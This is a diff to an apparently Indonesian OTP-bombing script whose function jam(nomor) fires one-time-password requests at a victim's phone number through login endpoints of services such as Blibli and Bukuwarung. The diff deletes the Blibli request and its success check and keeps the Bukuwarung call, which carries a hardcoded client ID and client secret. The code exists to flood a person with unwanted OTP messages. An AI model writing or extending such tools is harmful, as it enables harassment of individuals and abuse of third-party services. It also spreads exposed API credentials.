@@ -353,32 +353,6 @@ def jam(nomor):
             ) """
 
             # 11
-            nomor = '{nomor}' 
-
-            headers = {
-                'Host': 'www.blibli.com',
-                'content-length': '27',
-                'accept': 'application/json, text/plain, */*',
-                'content-type': 'application/json;charset=UTF-8',
-                'sec-ch-ua-mobile': '?1',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
-                'sec-ch-ua-platform': 'Android',
-                'origin': 'https://www.blibli.com',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-dest': 'empty',
-                'referer': f'https://www.blibli.com/login?ref=&logonId=0{nomor}',
-                'accept-encoding': 'gzip, deflate, br',
-                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-            }
-
-            data = {
-                'username': f'0{nomor}'
-            }
-
-            response_blibli = requests.post("https://www.blibli.com/backend/common/users/_request-otp", headers=headers, data=json.dumps(data))
-
-            # 12
             response_Bukuwarung_wa_500xend = requests.post(
                 "https://api-v2.bukuwarung.com/api/v2/auth/otp/send",
                 headers={
@@ -409,7 +383,7 @@ def jam(nomor):
                     "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6",
                     "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"
                 })
-            ).text
+            )
 
 
 
@@ -490,14 +464,6 @@ def jam(nomor):
                 rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTO Hernic. Status code: {response_harnic.status_code}") """
-            
-            if response_blibli.status_code == 200:
-                autoketik(f"{putih}Sukses Mengirim OTP Belibli!")
-                countdown(100)
-                #time.sleep(60)
-                rto = True
-            else:
-                autoketik(f"{merah}Gagal mengirim OTP Blibli. Status code: {response_blibli.status_code}")
 
             if response_Bukuwarung_wa_500xend.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Bukawarung!")
